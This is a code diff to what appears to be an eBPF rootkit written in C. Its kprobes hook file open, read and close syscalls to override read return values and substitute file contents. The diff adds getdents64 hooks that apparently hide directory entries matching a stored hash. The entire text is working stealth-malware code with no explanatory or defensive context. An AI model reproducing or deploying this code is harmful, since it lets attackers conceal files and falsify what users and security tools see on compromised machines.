@@ -2,6 +2,7 @@
 #include <linux/ptrace.h>
 #include <linux/types.h>
 #include <linux/version.h>
+#include <linux/dirent.h>
 
 #include "include/bpf.h"
 #include "include/bpf_helpers.h"
@@ -71,7 +72,7 @@ static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struc
         {
             return 0;
         }
-        else if (path_attr->action)
+        else if (path_attr->action.id)
         {
             if (!path_attr->fs_hash || path_attr->fs_hash == get_fs_hash(dentry))
             {
@@ -116,10 +117,7 @@ int _vfs_open(struct pt_regs *ctx)
 
     struct rk_file_t file = {
         .action = path_attr->action,
-        .override_id = path_attr->override_id,
-        .value = path_attr->value,
     };
-
     bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);
 
     return 0;
@@ -143,8 +141,6 @@ int __x64_sys_openat_ret(struct pt_regs *ctx)
 
     struct rk_fd_attr_t fd_attr = {
         .action = file->action,
-        .override_id = file->override_id,
-        .value = file->value,
     };
     bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);
 
@@ -157,6 +153,7 @@ int __x64_sys_close(struct pt_regs *ctx)
     u64 pid_tgid = bpf_get_current_pid_tgid();
 
     bpf_map_delete_elem(&rk_files, &pid_tgid);
+    bpf_map_delete_elem(&rk_getdents, &pid_tgid);
 
     struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
 
@@ -195,11 +192,9 @@ int kprobe_sys_read(struct pt_regs *ctx)
         return 0;
     }
 
-    bpf_printk(">>>: %d %d\n", fd_attr->action, fd_attr->value);
-
-    if (fd_attr->action == OVERRIDE_RETURN_ACTION)
+    if (fd_attr->action.id == OVERRIDE_RETURN_ACTION)
     {
-        bpf_override_return(ctx, fd_attr->value);
+        bpf_override_return(ctx, fd_attr->action.return_value);
 
         return 0;
     }
@@ -240,7 +235,7 @@ int _vfs_read(struct pt_regs *ctx)
         return 0;
     }
 
-    bpf_tail_call(ctx, &read_ret_progs, file->action);
+    bpf_tail_call(ctx, &rk_progs, file->action.id);
 
     return 0;
 }
@@ -267,11 +262,10 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
         return 0;
     }
 
-    // handle override content
-    if (fd_attr->action == OVERRIDE_CONTENT_ACTION)
+    if (fd_attr->action.id == OVERRIDE_CONTENT_ACTION)
     {
         struct rk_fd_content_key_t fd_content_key = {
-            .id = fd_attr->override_id,
+            .id = fd_attr->action.override_id,
             .chunk = fd_attr->override_chunk,
         };
 
@@ -287,6 +281,55 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
 
         fd_attr->override_chunk++;
     }
+
+    return 0;
+}
+
+SEC("kprobe/__x64_sys_getdents64")
+int __x64_sys_getdents64(struct pt_regs *ctx)
+{
+    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+
+    int fd;
+    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));
+
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_fd_key_t fd_key =
+        {
+            .fd = fd,
+            .pid = pid_tgid >> 32,
+        };
+
+    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
+    if (!fd_attr)
+    {
+        return 0;
+    }
+
+    struct linux_dirent64 *dirent;
+    bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));
+
+    struct rk_getdents_t getdents = {
+        .dirent = dirent,
+        .hidden_hash = fd_attr->action.hidden_hash,
+    };
+
+    bpf_map_update_elem(&rk_getdents, &pid_tgid, &getdents, BPF_ANY);
+
+    return 0;
+}
+
+SEC("kretprobe/__x64_sys_getdents64")
+int __x64_sys_getdents64_ret(struct pt_regs *ctx)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
+    if (!getdents)
+    {
+        return 0;
+    }
+
+    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS);
 
     return 0;
 }
